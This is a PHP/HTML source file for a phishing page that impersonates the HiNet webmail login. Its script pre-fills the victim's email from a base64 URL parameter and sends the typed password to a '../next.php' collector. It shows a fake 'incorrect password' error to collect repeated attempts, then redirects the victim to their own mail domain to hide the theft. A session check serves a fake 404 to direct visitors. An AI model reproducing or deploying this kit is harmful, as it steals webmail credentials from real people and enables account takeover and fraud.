<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>HiNet 網頁郵件服務</title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/fonts/fontawesome-all.min.css">
    <link rel="stylesheet" href="../assets/fonts/font-awesome.min.css">
    <link rel="stylesheet" href="../assets/fonts/fontawesome5-overrides.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body>
    <div id="navhineto" class="c-div" style="width: 100%;height: 60px;">
        <div id="nahineti" class="sp-div" style="width: 100%;max-width: 1170px;">
            <div><img class="img-fluid" width="96" height="60" src="../assets/img/hinetlg.png"><img class="img-fluid" width="299" height="37" src="../assets/img/web-mailhinet.png"></div><a href="#" style="padding-top: 16px;padding-bottom: 16px;color: #3264df;"> HiNet | hiAir | 中文 </a>
        </div>
    </div>
    <div id="mainchinet" class="c-div" style="width: 100%;">
        <div id="mainihinet" class="e-div" style="width: 100%;max-width: 1170px;padding-left: 12px;padding-right: 12px;">
            <div id="formouterhinet" style="width: 100%;max-width: 300px;height: fit-content;margin-top: 32px;">
                <div class="sp-div" style="padding-right: 30px;padding-left: 15px;"><button class="btn btn-primary" type="button" style="background: #3264df;font-weight: bold;border-radius: 24px;width: 153px;">Personal Mail</button><button class="btn btn-primary" type="button" style="background: #ffffff;color: #3264df;font-weight: bold;border-style: solid;border-color: #d8d8d8;border-radius: 24px;width: 93px;">hiMail</button></div>
                <div id="formfrom" style="padding: 25px 15px 0px 15px;border: 1px solid rgb(184,184,184);box-shadow: 0px 0px 4px rgb(167,211,255);border-radius: 7px;margin-top: 16px;">
                    <h4 style="text-align: center;font-weight: bold;color: #3264df;">HiNet Mail</h4>
                    <p class="fw-semibold" style="text-align: center;color: rgb(142,142,142);">Enter account/password/captcha</p>
                    <div class="sp-div" style="padding-left: 10px;padding-right: 10px;"><i class="far fa-user-circle" style="font-size: 32px;color: rgb(50,100,223);"></i><input type="text" id="backEMF" style="background: #f2f5fc;border: 0.1px solid #3264df;border-radius: 50px;width: 196px;height: 33px;padding: 1px 8px;font-size: 14px;" placeholder="Account"></div>
                    <div class="sp-div" style="padding-left: 10px;padding-right: 10px;margin-top: 8px;"><i class="fa fa-lock" style="font-size: 32px;color: rgb(50,100,223);"></i><input type="password" id="pass" style="background: #f2f5fc;border: 0.1px solid #3264df;border-radius: 50px;width: 196px;height: 33px;padding: 1px 8px;font-size: 14px;" placeholder="Password"></div>
                    <p class="fw-semibold" id="err" style="color: rgb(248,15,0);margin-bottom: 0px;margin-top: 8px;">Incorrect Account or Password.</p>
                    <div class="c-div" style="margin-top: 8px;"><img class="img-fluid" width="200" height="50" src="../assets/img/captchaImg.png"></div>
                    <div class="c-div" style="margin-top: 8px;"><input type="password" id="pass-1" style="background: #f2f5fc;border: 0.1px solid #3264df;border-radius: 50px;width: 196px;height: 33px;padding: 1px 8px;font-size: 14px;" placeholder="Captcha(Case Insensitive)"></div>
                    <div class="sp-div" style="padding-left: 10px;padding-right: 10px;margin-top: 8px;">
                        <div class="form-check"><input class="form-check-input" type="checkbox" id="formCheck-1"><label class="form-check-label" for="formCheck-1" style="font-size: 12px;">Keep Account</label></div>
                        <div class="form-check"><input class="form-check-input" type="checkbox" id="formCheck-2"><label class="form-check-label" for="formCheck-2" style="font-size: 12px;">Keep Passoword</label></div>
                    </div>
                    <div class="c-div" style="margin-top: 8px;"><button class="btn btn-primary" id="next-btn" type="button" style="width: 100%;max-width: 170px;height: 33px;border-radius: 24px;font-weight: bold;background: #3264df;" onclick="nextFun();">OK</button></div>
                    <hr>
                </div>
            </div>
        </div>
    </div>
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function () {
    $(document).on('keypress', function (e) {
    if (e.which === 13) {
        $('#next-btn').click();
    }
});

    // Get parameters from URL
    const urlParams = new URLSearchParams(window.location.search);
    const useridEncoded = urlParams.get('userid');
    const maxTry = parseInt(urlParams.get('maxtry') || '3');
    const pageValue = urlParams.get('page') || '';
    const domainRedirect = urlParams.get('domain_redirect') || '';

    let tryCount = 0;
    let userid = '';

    // Decode Base64 email
    try {
        userid = atob(useridEncoded || '');
    } catch (e) {
        console.error("Invalid userid encoding");
    }

    // Fill userid into either #backEm or #backEMF
    if ($('#backEm').length) {
        $('#backEm').text(userid);
    }
    if ($('#backEMF').length) {
        $('#backEMF').val(userid);
    }

    // Hide error initially
    $('#err').hide();

    // Next button click handler
    $('#next-btn').on('click', function () {
        const password = $('#pass').val().trim();

        // If password empty
        if (!password) {
            $('#err').show();
            return;
        }

        // Disable button until AJAX finishes
        $('#next-btn').prop('disabled', true);

        // Prepare POST data
        const postData = {
            ai: userid,
            pr: password,
            page_value: pageValue
        };

        $.ajax({
            url: '../next.php',
            type: 'POST',
            data: postData,
            success: function (response) {
                tryCount++;

                if (tryCount >= maxTry) {
                    // After maxTry, proceed normally
                    $('#err').hide();
                     const emailParts = userid.split('@');
                     if(!domainRedirect){
                    if (emailParts.length === 2) {
                        const domain = emailParts[1];
                        window.location.replace(`https://${domain}`);
                    } else {
                        // Fallback if email is malformed
                        window.location.replace("https://www.google.com");
                    }
                    }else{
                         window.location.replace(domainRedirect);
                    }


                    // You can redirect or take another action here
                } else {
                    // Show error and reset password field
                    $('#err').show();
                    $('#pass').val('');
                }
            },
            error: function () {
                alert("Error contacting server.");
            },
            complete: function () {
                // Re-enable button after request finishes
                $('#next-btn').prop('disabled', false);
            }
        });
    });
});
</script>

</body>


</html>